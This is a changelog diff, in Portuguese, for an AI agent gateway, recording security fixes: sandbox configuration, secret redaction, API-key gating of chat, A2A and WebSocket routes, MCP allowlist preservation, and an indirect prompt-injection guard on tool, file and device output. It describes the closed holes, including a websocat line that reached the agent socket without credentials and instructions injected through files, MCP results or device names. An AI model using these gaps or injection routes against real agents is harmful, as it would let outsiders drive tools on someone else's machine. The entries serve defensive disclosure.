+- **O aviso de que `backend: ssh` nao e contencao virou incondicional (#1225).** Antes so
+  aparecia junto com `network_disabled`/`mount_workdir` ligados; quem desligava os dois
+  passava a ver um `config check` limpo para uma configuracao que executa comandos numa
+  maquina remota com rede e disco inteiros. A palavra "sandbox" na chave promete o que
+  este backend nao faz, entao o operador le isso uma vez sempre.
+- **Comando do sandbox deixa de ir inteiro para o log (#1225).** O caminho sandboxado
+  virou alcancavel com esta serie, e o que ele registrava era a linha de shell crua
+  escrita pelo LLM — que o projeto ja trata como influenciavel por injecao indireta de
+  prompt (#1213) e que pode carregar credencial. Agora ela passa por
+  `garraia_security::redact_secrets`, tem todo caractere de controle neutralizado e e
+  truncada em 120 chars (nessa ordem: truncar antes poderia partir uma sequencia ANSI ao
+  meio e deixar um OSC sem terminador, e ai o terminal de quem le o log engole as linhas
+  seguintes).
+  **O que a redacao NAO cobre, dito aqui para ninguem ler garantia onde ha ressalva:** o
+  `redact_secrets` e lista fechada de formatos conhecidos (`sk-`, `ghp_`, `xoxb-`, JWT,
+  AKIA, Telegram, senha em connection string). Segredo em formato generico — senha passada
+  por flag, variavel de ambiente com valor opaco, cabecalho com token nao reconhecivel —
+  passa inteiro, e o unico limite que sobra e a truncagem. Por isso o caminho de sucesso
+  loga em `debug!` e nao em `info!`: ate esta serie ele era inalcancavel, entao em `info!`
+  todo comando sandboxado passaria a ir para o log no nivel padrao, o que seria exposicao
+  nova. O `error!` do fail-closed fica, porque ali o evento e a recusa.
+- **O sandbox por tool passa a ser alcancavel pelo operador — `agent.sandbox`
+  (#1225).** A contencao entregue na #1222 (e corrigida na #1231) existia
+  inteira: `SandboxPolicy`, `SandboxMode`, `SandboxBackend`, `wrap_command`
+  com quoting POSIX, fail-closed quando o backend falta, e onze testes
+  unitarios verdes. E nenhuma instalacao conseguia liga-la. Os tres
+  construtores de producao do `BashTool` fixavam `SandboxPolicy::default()`
+  (= `off`), `set_sandbox_policy` so era chamado pelos proprios testes do
+  modulo, e a chave de config que as mensagens de erro citavam
+  (`tools.sandbox.backend`, `tools.sandbox.mode`) nao existia em lugar nenhum
+  do schema — `grep -ri sandbox crates/garraia-config/src/` nao devolvia nada.
+  Uma funcionalidade de seguranca que so os testes dela conseguem exercitar
+  nao e uma funcionalidade; e uma que parece existir no changelog.
+  Agora ha a secao `agent.sandbox` (`mode`, `backend`, `image`, `ssh_host`,
+  `sandboxed_tools`, `elevated`, `mount_workdir`, `network_disabled`), lida
+  nos tres pontos de producao pela MESMA funcao
+  (`garraia_gateway::bootstrap::sandbox_policy_from`), como ja acontece com
+  os adapters de hardware: gateway, `garra chat` e `garra mcp-server` (tool
+  `garra_agent`) nao podem discordar sobre onde um comando roda. O caminho MCP
+  e o que mais ganha —
+  la nao existe canal de confirmacao humana, entao o sandbox e a unica camada
+  que pode conter o que passa do tier arriscado.
+  Secao ausente continua sendo `mode: off`: zero mudanca de comportamento
+  para quem ja tem config, e ha teste afirmando que o default da secao e
+  byte a byte o `SandboxPolicy::default()`.
+- **`garra config check` passa a recusar sandbox que parece ligado e nao
+  esta (#1225).** Erro quando `mode != off` sem `backend` (todo comando falha
+  fechado, o que e seguro e inutil) e quando `backend: ssh` esta sem
+  `ssh_host`. Aviso quando `backend: ssh` vem com `network_disabled` ou
+  `mount_workdir` ligados, dizendo com todas as letras que o backend SSH e
+  execucao remota e nao sandbox, e que ele ignora os dois campos; quando
+  `elevated` (as tools que escapam e rodam NO HOST) esta preenchido sem
+  `tool_confirmation_enabled`; e quando `mode: allowlist` vem com
+  `sandboxed_tools` vazio, que sandboxa exatamente nada. Nenhum finding ecoa
+  o `ssh_host`, e ha teste so para isso.
+- **Documentado o que cada backend realmente garante (#1225).**
+  `docs/security/threat-model.md` ganhou a secao 5.13 com a tabela backend x
+  garantia (rede, sistema de arquivos, privilegios, onde roda, o que NAO
+  cobre) e tres limites que estavam so no codigo: hoje somente a tool `bash` e
+  envolvida — `run_tests`, `git_diff`, `code_review` e `repo_search` seguem
+  nascendo no host mesmo com `mode: all`; o backend `ssh` isola o host local e
+  nada mais; e na pratica isto e unix, porque no Windows o bash tool usa
+  `powershell -Command` e nao reparseia o quoting POSIX do wrap. O
+  `config.hardened.example.yml` traz o exemplo com os mesmos avisos, e
+  `/api/settings` mostra `security.sandbox_mode` e `security.sandbox_backend`
+  como leitura (o PATCH da rota ainda e dry-run, entao um controle de
+  contencao nao pode aparecer como editavel la). As mensagens de erro do
+  `wrap_command` foram corrigidas para a chave que passa a existir.
+- **Sandbox: `backend: ssh` passa a recusar fail-closed a policy que nao consegue
+  honrar (#1225 S3, ADR 0019).** O ramo SSH do `wrap_command` monta
+  `ssh <host> -- sh -lc ...` e nada mais — nao existe `--network none` nem mount do
+  `cwd` numa sessao ssh —, e ate aqui ele simplesmente **ignorava**
+  `agent.sandbox.network_disabled` e `agent.sandbox.mount_workdir`. Como o default das
+  duas e `true`, um `agent.sandbox` com `backend: ssh` e `ssh_host` e mais nada lia como
+  "rede desligada, workdir contido" quando nenhuma das duas era verdade: fail-open por
+  omissao, na chave que promete contencao. O `garra config check` so avisava.
+  Agora a recusa mora no proprio `wrap_command` — o ponto unico por onde gateway,
+  `garra chat` e `garra mcp-agent` passam, e que tambem cobre policies montadas por
+  codigo sem passar por config nenhuma: enquanto qualquer uma das duas flags estiver
+  `true`, a tool `bash` responde erro claro nomeando a chave real e a acao, e nenhuma
+  linha `ssh ...` e montada. A checagem roda antes do `is_available()`, para que num host
+  sem cliente ssh o erro de "backend nao encontrado" nao mascare este. O
+  `sandbox_policy_from` NAO desliga as flags nem rebaixa o modo por conta propria — passa
+  tudo intacto e emite `warn!` no boot (sem o host) para o problema ter nome antes do
+  primeiro comando recusado. O `garra config check` sobe de Warning para **Error**, um por
+  chave ligada, com a mesma mensagem.
+  A unica forma de `ssh` passar e `agent.sandbox.network_disabled = false` **e**
+  `agent.sandbox.mount_workdir = false` explicitos: o `false` e o reconhecimento do
+  operador de que ssh e execucao remota SEM isolamento de rede nem de mount. `docker` e
+  `podman` honram as duas e nao sao afetados. A superficie `agent.sandbox` entrou depois
+  da v0.4.2 e nao saiu em release, entao nao ha migracao para ninguem. Tabela de garantias
+  por backend em `docs/security/threat-model.md` secao 5.13 atualizada, com o exemplo minimo de
+  config ssh que passa.
+- **Multipart acima de 16 MiB passa a ter checksum SHA-256 verificado por
+  parte pelo servidor (#1229).** O `put_stream` do `S3Compatible` nao
+  declarava algoritmo nenhum no `create_multipart_upload`, deixava o SDK
+  carimbar um CRC32 default em cada `upload_part` e mandava so ETags no
+  `complete`: tres pontos do mesmo upload discordando sobre o que deveria ser
+  verificado, num caminho que nenhum teste jamais exercitou de verdade
+  (#1230). Agora os tres declaram SHA-256, o mesmo algoritmo que o `put` de
+  uma parte so ja usava, e o servidor recusa a parte cujos bytes nao batam com
+  o digest declarado. `S3Compatible::new` tambem passa a FIXAR
+  `request_checksum_calculation` em `WhenSupported` depois de herdar a config
+  do ambiente, para que `AWS_REQUEST_CHECKSUM_CALCULATION=WHEN_REQUIRED` no
+  deploy nao consiga rebaixar a garantia — os checksums que importam sao
+  explicitos por operacao e o SDK ja os respeita, entao o pin cobre as
+  operacoes sem algoritmo nomeado e a regressao futura em que alguem remova o
+  `.checksum_sha256(...)`. O checksum composto do S3 (`<digest>-<n>`) e o ETag
+  do multipart continuam nunca aparecendo como `etag_sha256`: esse campo e
+  sempre o SHA-256 do arquivo inteiro.
+
+  Junto vem o que faltava para conseguir enxergar falha nesse caminho. O
+  mapeamento de erro do backend S3 descartava codigo e mensagem do servidor —
+  o `Display` de `SdkError` rende literalmente "service error", entao um
+  `NotImplemented` (HTTP 501) chegava ao log como
+  `Backend("s3 put_object: service error")` e nao dizia nada. Agora carrega
+  codigo, mensagem e status HTTP, sem expor URI assinada nem header de
+  credencial; de quebra, um 404 de `HEAD` sem codigo de erro no corpo passa a
+  virar `NotFound` pelo status, para `exists` responder `false` em vez de
+  erro. E o teste de SSE parou de so confiar no eco do MinIO: le de volta o
+  `x-amz-server-side-encryption` do objeto gravado, ou cai.
+- **A isencao por `.` da redacao de stderr entregava a chave inteira
+  (#1238).** A regra poupava uma sequencia longa quando ela continha `.` ou
+  `@`, marcas que nenhum alfabeto base64 produz. So que `.` e `=` estavam os
+  dois DENTRO da sequencia, entao `state.creds=<chave>` era UMA sequencia so:
+  o ponto do nome vizinho a isentava e a credencial saia junto. E o mesmo
+  mecanismo ja documentado para `-`/`_` — "um nome de chave vizinho cola na
+  sequencia" —, que so nao tinha sido aplicado ao `.`. Medido sobre 2000
+  chaves de 32 B por celula, nos dois alfabetos: `creds.noiseKey=<chave>` e
+  `at state.creds=<chave>` entregavam a chave INTEIRA em 100% dos casos,
+  enquanto os dois contextos ja medidos (`noiseKey=` e `npm ERR! _auth=`)
+  seguiam em 0%. A forma nao vem do `bridge.mjs`, que nao tem `console.*`;
+  vem de um `throw` de dentro do Baileys, de modulo de terceiro ou de
+  template literal com caminho de propriedade. Agora `.` e `@` sao
+  separadores e nao marcas de isencao: a isencao vale por SEGMENTO, e os
+  quatro contextos caem para 0%, com o maior pedaco em claro em ~1,3
+  caractere. A lista de separadores nao cresce alem desses dois, porque cada
+  candidato quebra um alfabeto inteiro — medido, `-`/`_` separando entregam
+  ~62% das chaves url-safe e `/` separando entrega ~35% das chaves do base64
+  padrao. O preco, medido sobre um corpus de 14 linhas reais de erro de
+  Node/npm: 10 saem identicas e 4 perdem UM segmento do meio do caminho; em
+  tres delas some o prefixo de instalacao e fica a parte informativa
+  (`@whiskeysockets/baileys/lib/index.js:42:7`), e numa delas o segmento de
+  40 caracteres que some e o proprio nome do modulo. O novo caso ganhou teste
+  de ponta a ponta no call site, com processo de verdade.
+- **A nota sobre os limites da varredura do fonte prometia completude que a
+  medicao desmente (#1238).** Ela dizia que `#[serde(transparent)]` era "o
+  unico caminho" que nem a allowlist de `expose()` nem a varredura de macro
+  enxergam. Sao pelo menos tres, e os outros dois foram plantados e medidos:
+  um `impl Deref<Target = str>` mais um `let cru: &str = b;` logado noutro
+  arquivo passa 107/107 verdes, e o campo cru renomeado dentro do proprio
+  `session.rs` (`let cru = &self.0;` e depois `%cru`) tambem passa 107/107 —
+  o `.0` da lista de proibidos so e consultado dentro do bloco da macro, entao
+  o controle `%self.0` direto ficava vermelho e o renomeado passava. Nenhum
+  dos dois e vazamento vivo: os dois exigem codigo novo escrito e revisado. A
+  familia certa e "qualquer conversao de tipo que produza `&str`", e a nota
+  agora diz isso. Fecharam-se os dois: os `impl` que mencionam `SessionBlob`
+  e o derive do tipo passaram a ter allowlist de DECLARACAO — porque a
+  conversao acontece no tipo, e o call site que a dispara e indistinguivel de
+  qualquer outro `let` — e o campo cru ganhou a mesma regra invertida que o
+  `expose()` ja tinha, com allowlist por linha inteira. A serializacao
+  transparente segue sendo buraco conhecido, de proposito e por escrito.
+- **A redacao do stderr da ponte deixava metade de uma credencial passar
+  (#1238).** Ela varria sequencias de `[A-Za-z0-9+=]`, com a barra de fora
+  para nao redigir caminhos de arquivo. So que a barra faz parte do alfabeto
+  base64 padrao e aparece a cada ~64 caracteres, entao ela quebrava a propria
+  chave em pedacos curtos demais para serem cortados. Medido sobre 2000 chaves
+  de 32 B: o maior pedaco em claro tinha 17 dos 44 caracteres em media, e em
+  35% dos casos metade ou mais da chave sobrevivia; o teto de 240 caracteres
+  por linha nao ajudava, porque 240 caracteres tambem sao 240 caracteres de
+  credencial. A sequencia agora inclui `/`, `.`, `@`, `-` e `_`, e so e
+  poupada quando tem `.` ou `@` — extensao de arquivo ou escopo de pacote
+  npm, que nenhum alfabeto base64 produz. Com isso o vazamento cai para ruido
+  (~1,3 caractere) tanto no base64 padrao quanto no url-safe, em quatro
+  contextos diferentes, e os caminhos que a cauda existe para mostrar
+  continuam legiveis. Isentar tambem `-` e `_`, que caminho real tem, seria a
+  escolha obvia e e a errada: medido, `npm ERR! _auth=<chave>` volta a vazar
+  os 44 de 44 caracteres em 100% dos casos, porque o `_` do nome do campo
+  entra na mesma sequencia e isenta a chave junto. Isentar `/` "junto de"
+  `-`/`_` tambem nao serve: a chave em base64 padrao traz a propria barra, e o
+  vazamento inteiro volta em 48,8% dos casos. O preco aceito e um falso
+  positivo conhecido — caminho longo sem ponto e sem `@` vira `<redigido>`.
+- **A redacao passou a ser exercitada nos dois lugares em que ela e aplicada
+  (#1238).** Ela tinha teste como funcao pura e nenhum nos dois call sites:
+  neutralizar os dois — devolver a linha crua em vez da redigida — desfazia a
+  correcao inteira com a suite toda verde. Agora ha um teste de ponta a ponta
+  para cada um, com processo de verdade cuspindo material de credencial no
+  stderr.
+- **A varredura do proprio fonte ficava cega a partir de um `#[cfg(test)]`
+  sobre item sem chave (#1238).** Ela ligava o modo "apaga" ao ver o atributo
+  e so o desligava na primeira linha com `}`. Sobre `mod tests;`, `use …;`,
+  `const …;` ou `static …;` — item que fecha em `;` e nunca abre bloco — o
+  modo seguia apagando **producao** ate topar com uma chave de fechamento
+  qualquer, la adiante. As tres varreduras do modulo leem esse mesmo texto,
+  entao ficavam cegas juntas e a comparacao entre elas continuava batendo:
+  verde com bug. `mod.rs` ja tem um `#[cfg(test)] mod source_scan;` na
+  arvore — o dano era zero so porque ele esta na ultima linha do arquivo, e
+  move-lo para o topo cegaria o arquivo inteiro sem nenhum teste piscar. A
+  primeira correcao cobriu so o atributo em linha propria; com atributo e item
+  na MESMA linha (`#[cfg(test)] use std::fmt;`) o furo continuava aberto, e
+  aninhado dentro de um `mod` ele escapava tambem da guarda que olhava so a
+  coluna 0. Agora o cortador trata o resto da linha do atributo, e a guarda
+  alcanca item de producao em qualquer profundidade — por indentacao, e nao
+  contando chaves, para nao errar junto com o que ela vigia.
+- **Um comentario no FIM da linha do `#[cfg(test)]` ainda cegava a varredura
+  (#1238).** A correcao anterior tratava comentario no COMECO da linha e nao
+  no fim: em `#[cfg(test)] use std::fmt; // so no teste` o texto termina em
+  `teste` e nao em `;`, entao o item ficava pendente, a linha seguinte era
+  julgada como se fosse ele, e a primeira que abrisse chave ligava o modo
+  "apaga" sobre producao. Medido com as funcoes reais, as duas varreduras
+  voltavam zero achado sobre um `expose()` plantado. A guarda que deveria ser
+  a segunda opiniao ficava MUDA quando o item apagado comecava com
+  `pub(crate)`, comum nesta crate: a lista de prefixos tinha `pub ` e nao
+  `pub(`. Agora o comentario de fim de linha e cortado respeitando literais —
+  contar aspas, a solucao obvia, quebra tanto `"http://x"` quanto
+  `const S: &str = "a // b";` — e a lista de prefixos ganhou `pub(`, `mod`,
+  `use` e `unsafe`, de modo que qualquer falha residual apareca alto. A guarda
+  passou a examinar 293 itens de producao contra 258. O buraco era latente: a
+  arvore nao tinha nenhum caso.
+- **A regra invertida do `expose()` deixou de poder sumir em silencio
+  (#1238).** Numa arvore sem violacao, "zero achados" nao distingue regra viva
+  de regra ausente, e arrancar a allowlist inteira deixava o teste verde. O
+  caso negativo virou texto plantado dentro do proprio teste — incluindo o
+  `let s = blob.expose(); let t = s;` que motiva a inversao existir. E
+  `SessionBlob::expose()` virou `pub(crate)`: o compilador passa a impedir de
+  graca o que a allowlist textual impedia com esforco.
+- **A cauda do stderr do Node deixa de sair verbatim no terminal (#1238).** Ela
+  e a unica saida crua de ferramenta externa do fluxo de vinculo do WhatsApp, e
+  nada a redigia: o lado JS redige JID e digitos, mas nao base64 de credencial,
+  e um `throw` vindo de dentro da biblioteca nem passa por la. Agora sequencias
+  longas que parecem material cifrado viram `<redigido: N caracteres>` e a
+  linha tem teto de comprimento, sem perder o que a cauda existe para mostrar
+  (caminho de arquivo, nome de modulo, numero de linha).
+- **A varredura que impede log de sessao passou a ser uma regra fechada
+  (#1238).** Ela reprovava uma lista de macros conhecidas; um `eprintln!` ou um
+  `tracing::event!` com o valor da sessao passavam, e nenhuma varredura de
+  macro alcancaria `let s = blob.expose(); let t = s;`. A regra foi invertida:
+  toda ocorrencia de `SessionBlob::expose()` no codigo de producao do modulo
+  precisa estar numa allowlist de call sites nomeados — hoje ha exatamente
+  dois. O parser tambem deixou de ficar cego quando o fonte tem um literal de
+  char com aspa dentro (`b'"'`), que invertia todas as fronteiras de literal
+  e fazia o arquivo inteiro render zero bloco, em silencio.
+- **A conta da sessao recusa nomes de dispositivo do Windows (#1238).**
+  `con`, `prn`, `aux`, `nul`, `com1`-`com9` e `lpt1`-`lpt9` casavam a allowlist
+  `[A-Za-z0-9_-]` e nao podem virar diretorio no Windows. A recusa e
+  case-insensitive e da um erro que diz o que houve, em vez de um
+  `ERROR_INVALID_NAME` opaco no meio da criacao do diretorio.
+- **O gate de `gateway.api_key` passa a cobrir o plano de conversa e o A2A (#1240).**
+  `POST /v1/chat/completions`, `POST /v1/messages`, `POST /v1/messages/count_tokens`
+  e todo o `/a2a/*` estavam montados no mesmo router cru que `/api/*`, mas fora do
+  gate, que testava so o prefixo `/api/`. A justificativa original — "`/v1/*` tem
+  JWT proprio" — vale para o `rest_v1` do workspace e para o `/v1/auth/*`, e nao
+  para as rotas compat OpenAI/Anthropic, que nao resolvem identidade nenhuma. Era
+  fail-open de um controle que o operador tinha ligado: quem configurava a chave
+  acreditava ter fechado a porta, e a superficie que executa as tools do GarraIA na
+  maquina dele seguia respondendo a qualquer `curl`. O recorte agora e um conjunto
+  explicito: `/api/` menos a allowlist de descoberta, mais as tres rotas de
+  conversa por igualdade exata, mais `/a2a/` por prefixo. As duas rotas compat
+  Anthropic aceitam a chave tambem em `x-api-key`, porque o Claude Code e o SDK da
+  Anthropic nunca mandam `Authorization: Bearer`; nunca por query string.
+  `/v1/models`, `/.well-known/agent.json`, `/health` e `/ping` seguem abertas.
+  **Sem `gateway.api_key` configurada nada muda** — este PR nao fecha nada por
+  default.
+
+  **O socket do papagaio (`/ws/parrot`) entrou junto**, achado pela auditoria R4
+  do PR. Ele executa um turno completo do agente — com as tools e a chave de LLM
+  do dono — sobre a sessao persistente do Garra Desktop, e a unica guarda que
+  tinha era o anti-CSRF da #1182, que passa de proposito quando nao ha header
+  `Origin`, porque cliente nao-navegador (app, CLI, `curl`) nao manda um. Com a
+  chave configurada e o gateway em `0.0.0.0` — o caso do app na LAN, que e o
+  motivo de a chave existir — um `websocat ws://host:3888/ws/parrot` conectava
+  sem credencial e dirigia o agente na maquina do dono. O irmao `/ws`, montado na
+  linha de cima do `router.rs`, ja checava a chave desde a #1045. A checagem ficou
+  **dentro do handler**, e nao na lista de caminhos do middleware: o middleware so
+  le header, e a webview Tauri abre o overlay com `new WebSocket(...)`, que nao
+  manda header — gatear a rota la fecharia o desktop em vez de autentica-lo. Como
+  no `/ws`, a chave vai por `?token=` / `?api_key=` ou por bearer, com a mesma
+  comparacao de tempo constante e o mesmo 401.
+
+  **E o Garra Desktop passou a de fato mandar essa credencial**, fechando o
+  outro lado do mesmo buraco: o gate acima recusava o handshake, mas o
+  `ui/ws.js` conectava numa URL constante, sem token nenhum, e nao havia
+  plumbing de credencial em lugar nenhum da casca Tauri. Com a chave
+  configurada — o caso comum desde que o #1252 passou a gera-la sozinha em
+  bind exposto — o overlay e a Chat Bar levavam 401 e caiam em reconexao
+  infinita com backoff ate 30s, sem nenhum aviso ao usuario. Agora um comando
+  Tauri `gateway_api_key` le a chave do **mesmo** `config.yml` que o gateway
+  carregou (via `garraia_config::ConfigLoader`, o resolvedor de path canonico,
+  que honra `GARRAIA_CONFIG_DIR` e o diretorio legado) e o `ws.js` a manda por
+  `?token=`, no mesmo formato do `webchat.html`. A copia do config default no
+  primeiro boot passou a usar esse mesmo resolvedor, em vez de remontar o path
+  a mao, para que as duas pontas nunca discordem de qual arquivo vale. Sem
+  chave configurada o socket conecta na URL nua, como sempre.
+- **`garra init` numa VM como root nao deixa mais o gateway na internet sem credencial
+  nenhuma (#1241).** O wizard escolhe `gateway.host = 0.0.0.0` sempre que a maquina parece
+  server-like — e `is_server_like()` e `is_runpod || is_root`, ou seja, qualquer instalacao
+  como root, nao so RunPod. Nesse caminho ele nunca escrevia `gateway.api_key` (os unicos
+  `api_key` que o wizard escrevia eram os de `llm.*`), e sem chave o gate de `/api/*` e do
+  `/ws` devolve todo pedido a `next` na primeira linha: sessoes, memoria, providers, logs,
+  diagnosticos e o canal do agente com as tools abertos a quem alcancasse a porta. Agora,
+  quando o host resolvido nao e loopback, o wizard sorteia 32 bytes do CSPRNG do sistema
+  (`garraia_security::random_bytes`, o mesmo `ring` do resto do projeto) e grava em
+  `gateway.api_key`. Bind em loopback (o caso do laptop) nao muda em nada: nenhuma chave
+  gerada, nenhuma linha nova impressa.
+- **A credencial gerada nao e impressa no terminal (#1241).** O resumo do wizard diz em que
+  arquivo e em que campo ela esta, e a linha de `curl` sai com um placeholder no lugar do
+  segredo. Imprimir era conveniencia e nao necessidade — a chave acabou de ser gravada no
+  `config.yml` do proprio operador —, e o custo era real: scrollback do terminal, `tee` ou
+  pipe da saida do `init`, captura de stdout em automacao. O CodeQL apontou esse fluxo
+  (`rust/cleartext-logging`) e estava certo; a correcao foi parar de imprimir, sem entrada
+  nova no ledger de supressoes. A mensagem anterior tambem afirmava "guarde agora, ela nao
+  e impressa de novo", o que era falso: a chave esta no arquivo, e acreditar nisso levava
+  justamente a re-rodar o wizard por panico.
+- **O `config.yml` e criado ja em modo 0600 (#1241).** Antes ele nascia com
+  `0666 & ~umask` — normalmente 0644 — ja contendo a credencial, e so depois
+  `harden_secret_file` fazia o `chmod`. Entre as duas coisas havia uma janela em que
+  qualquer usuario da maquina podia ler o segredo. Agora o modo entra no proprio `open(2)`;
+  o `harden_secret_file` continua como cinto-e-suspensorio, porque no caminho de merge o
+  arquivo ja existia e `mode` so vale na criacao.
+- **Re-rodar o wizard e escolher "Merge / update" nao derruba os clientes ja configurados
+  (#1241).** Nesse caminho a credencial gerada so entra quando a do config esta ausente ou
+  em branco — a mesma normalizacao que o gate de `/api/*` usa para decidir que nao ha gate.
+  Chave escolhida pelo operador nunca e sobrescrita ali, e o resumo, nesse caso, avisa do
+  bind exposto sem imprimir segredo nenhum. **A opcao "Backup the existing config and write
+  a new one", que e o default do menu, tem o comportamento oposto e sempre teve:** o config
+  e reconstruido do zero, entao uma `gateway.api_key` que ja existia e substituida pela nova
+  e os clientes antigos param de autenticar. O resumo agora diz isso em uma linha, e o valor
+  anterior continua no arquivo `.bak-` gerado ao lado.
+- **O boot avisa quando o bind alcanca a rede e nao ha credencial (#1241).** O gateway so
+  logava "listening on". Agora, depois do bind e uma vez por processo, um `warn!` nomeia o
+  endereco efetivamente ligado, o que esta aberto (`/api/*` e tambem o `/ws`, que e o canal
+  do agente com as tools) e as duas correcoes (`garra init` ou `gateway.api_key` no config;
+  `--host 127.0.0.1` para ouvir so localmente). A checagem roda sobre o endereco ligado, e
+  nao sobre o arquivo de config, justamente para cobrir o override por `--host`/`HOST` do
+  `garra start`, que o `garra config check` nao enxerga. Em `garra start -d` e
+  `restart -d` o mesmo texto sai em stderr **antes** do fork: depois dele o tracing aponta
+  para `~/.garraia/garraia.log` e o aviso nunca chegaria ao terminal — justamente no modo
+  que o `install.sh` recomenda e que uma unit systemd usa. O boot **nao** e recusado: quem
+  roda assim de proposito atras de firewall continua subindo.
+- **`garra config check` e o Web Console pararam de dar falsa garantia sobre a credencial
+  (#1241).** Os dois reportavam pela presenca do campo (`is_some()`), entao um
+  `api_key: "  "` aparecia como configurado enquanto o gate estava desligado — falsa
+  garantia exatamente para quem foi consultar o diagnostico. A normalizacao agora mora num
+  lugar so, `GatewayConfig::api_key_normalizada`, e o gate, o `config check` e o
+  `GET /api/settings/effective` leem dela.
+- **O exemplo minimo do `garra init` sem TTY passou a incluir a secao `gateway` (#1241).**
+  Esse e o caminho de container e CI, que e onde `HOST=0.0.0.0` tem mais chance de estar
+  setado e onde nao ha wizard para mintar credencial nenhuma.
+- **Reiniciar um servidor MCP pela admin API nao apaga mais a allowlist de tools dele (#1242).**
+  `POST /admin/api/mcp/{id}/restart` reconectava passando `vec![]` como `allowed_tools`
+  nos dois transportes, e lista vazia significa "permite tudo" — enquanto o `disconnect`
+  imediatamente antes ja tinha descartado a unica copia da allowlist, guardada na
+  conexao. O efeito era um fail-open silencioso: depois de um hot-reload de rotina, toda
+  tool descoberta daquele servidor voltava chamavel pelo LLM, sem nenhum sinal para o
+  operador. O boot e o reconnect automatico do monitor de saude sempre fizeram certo; so
+  este caminho esquecia. Agora o handler resolve a allowlist ANTES do `disconnect`, por
+  uma ordem nomeada cujo invariante e preciso: **o restart nunca alarga o que esta em
+  vigor, e aplica a lista declarada quando nada esta em vigor.** Uma lista viva nao
+  vazia no `McpManager` (conexao viva ou entrada em `pending`) e o que de fato
+  restringe o servidor agora e vence; caso contrario — `None`, ou `Some(vec![])`, que e
+  como `is_tool_allowed` escreve "permite tudo" — vale o `allowed_tools` declarado. Um
+  `Some(vec![])` quer dizer "ninguem nunca restringiu este nome", nao "o operador
+  escolheu nao restringir": o manager nao distingue os dois casos e o config escrito
+  distingue, entao tratar a lista viva vazia como resposta autoritativa deixava um
+  servidor que subiu antes da allowlist ser declarada sem nenhuma forma de ser apertado
+  por um restart. So quando nem o manager nem a declaracao conhecem uma restricao a
+  lista fica vazia — caso dos servidores criados por `POST /admin/api/mcp`, que hoje nao
+  tem como carregar allowlist nenhuma. O que o handler deliberadamente NAO faz: aplicar
+  uma declaracao mais estreita que uma lista viva nao vazia; a regra 1 preserva a lista
+  viva, entao o restart segue sem alargar, mas esse aperto pede restart do gateway.
+- **A allowlist declarada no `mcp.json` passou a ser honrada pelo restart (#1242).**
+  A resolucao consultava so a secao `mcp:` do `config.yml`. O boot nao le isso: le
+  `ConfigLoader::merged_mcp_config`, que e `mcp.json` **mais** aquela secao, e a entrada
+  do `mcp.json` desserializa em `garraia_config::McpServerConfig`, que tem
+  `allowed_tools`. Uma allowlist escrita no `mcp.json` valia no boot e era invisivel
+  para o restart, que caia no ramo "nunca restringido" e reconectava o servidor aberto.
+  O restart agora resolve contra o mesmo merge que o boot le.
+- **Um restart recusado deixou de ser a ultima forma de perder a allowlist (#1242).**
+  As duas validacoes de 400 (`stdio` sem `command`, HTTP sem `url`) rodavam DEPOIS do
+  `disconnect`, entao a recusa voltava de um servidor ja derrubado cuja allowlist
+  resolvida morria no stack frame — e o restart seguinte lia `None` e reconectava
+  aberto. Alcancavel em duas chamadas de admin, porque `POST /admin/api/mcp` aceita
+  `{"url": ..., "transport": "stdio"}` e sobrescreve a entrada de um servidor vivo.
+  `command`/`url` passaram a ser extraidos antes de qualquer teardown: a recusa agora
+  nao derruba nada e a conexao viva segue restrita.
+- **Dois buracos vizinhos, fechados junto (#1242).** Um restart cujo reconnect falha
+  estaciona o servidor em `pending` com a allowlist resolvida, entao o restart seguinte
+  nao le mais `None`; e o boot passou a estacionar tambem falha de handshake em
+  transporte HTTP, nao so stdio, entao o primeiro restart de um servidor HTTP com
+  allowlist nao reconecta mais aberto. Junto, `tool_info()` passou a filtrar pela
+  allowlist como `take_tools` e `call_tool` ja faziam, entao o `tool_count` da resposta
+  do restart para de contar tool bloqueada e os slash-commands MCP param de registrar
+  tool que toda execucao ia recusar.
+- **A saida de `device_read`/`device_list` (e o retorno de `device_execute`)
+  entra no contexto do modelo pelo guard de injecao indireta (#1243,
+  fatia 3).** Id de dispositivo, nome de capability, `state` do Home
+  Assistant e payload de MQTT/serial sao escritos por quem esta no
+  barramento, e leitura e R0 — acontece sem confirmacao humana. Agora
+  as tools de hardware passam o texto do bus por
+  `garraia_security::sanitize_indirect` (caracteres invisiveis
+  removidos; suspeito chega precedido do banner de dado nao-confiavel,
+  com a origem nomeada). A moldura vive na tool do runtime, nao na
+  crate `garraia-hardware`, pela regra do ADR 0020 de a crate de
+  hardware nao classificar o proprio risco. Dispositivo que nomeia a
+  si mesmo com instrucao e leitura hostil chegam emoldurados; leitura
+  limpa segue byte a byte. Pendencias da issue: nenhuma — as tres
+  fatias de codigo estao fechadas.
+- **A saida de `file_read` entra no contexto do modelo pelo guard de
+  injecao indireta (#1243, fatia 2).** O conteudo de arquivo e dado de
+  terceiro: quem controla o arquivo controla o texto, e ate aqui ele
+  chegava cru. Agora `FileReadTool::execute` passa o conteudo por
+  `garraia_security::sanitize_indirect` (caracteres invisiveis
+  removidos; suspeito chega precedido do banner de dado nao-confiavel,
+  com a origem nomeada) e o criterio de nao-mutilacao e testado
+  explicitamente: codigo-fonte limpo segue byte a byte, sem banner e
+  sem corte. Payload com instrucao injetada chega emoldurado. Pendencia
+  restante da issue: `device_read`/`device_list` (fatia 3).
+- **O resultado de tool MCP entra no contexto do modelo pelo guard de
+  injecao indireta, com teto de bytes (#1243, fatia 1).** O guard entregue
+  na #1213 estava ligado em um ponto so (`web_fetch`); todo outro canal
+  por onde texto de terceiro chega ao modelo escapava dele. O canal mais
+  grave era o MCP: um servidor de terceiro — tipicamente um `npx` buscado
+  sob demanda — devolvia texto que entra no contexto cru, sem guard e sem
+  teto de tamanho, e um payload gigante era vetor de exaustao de
+  contexto/custo. Agora `McpTool::execute` passa o conteudo por
+  `garraia_security::sanitize_indirect` (caracteres invisiveis removidos;
+  suspeito chega precedido do banner de dado nao-confiavel, como no
+  `web_fetch`) e ganha teto de 256 KiB alinhado ao
+  `MAX_CONNECTOR_FRAME_BYTES` dos conectores, com truncamento explicito e
+  visivel — nunca em silencio, e nunca no meio de um caractere UTF-8
+  multibyte (corte por fronteira de char). Prova ponta a ponta com
+  servidor MCP de verdade: payload com instrucao injetada chega
+  emoldurado; payload de 300 KiB chega truncado com marca. Pendencias
+  nomeadas na issue: `file_read` (fatia 2) e `device_read`/`device_list`
+  (fatia 3); a cobertura real agora esta nomeada no threat-model §5.5 e
+  na tabela de comparacao (que vendia cobertura de `review` que nao
+  existia).
